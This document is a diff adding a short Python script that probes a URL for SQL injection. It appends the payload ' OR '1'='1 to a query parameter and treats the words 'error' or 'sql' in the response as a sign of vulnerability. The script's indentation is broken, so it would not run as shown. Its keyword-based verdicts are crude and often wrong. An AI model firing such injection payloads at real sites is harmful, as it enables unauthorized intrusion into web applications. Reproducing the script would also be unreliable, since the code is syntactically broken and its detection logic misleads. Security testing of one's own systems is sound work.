@@ -1,0 +1,18 @@
+
+import requests
+def test_sql_injection(url):
+    payload = "' OR '1'='1"
+    full_url = url + payload
+    print("Testing URL:", full_url)
+
+    try:
+        response = requests.get(full_url)
+         if "error" in response.text.lower() or "sql" in response.text.lower():
+            print("⚠ SQL Injection vulnerability might exist!")
+        else:
+            print("✅ No SQL Injection vulnerability found.")
+    
+    except Exception as e:
+   print("Error connecting to the site:", e)
+target = "http://example.com/search.php?id="
+test_sql_injection(target)
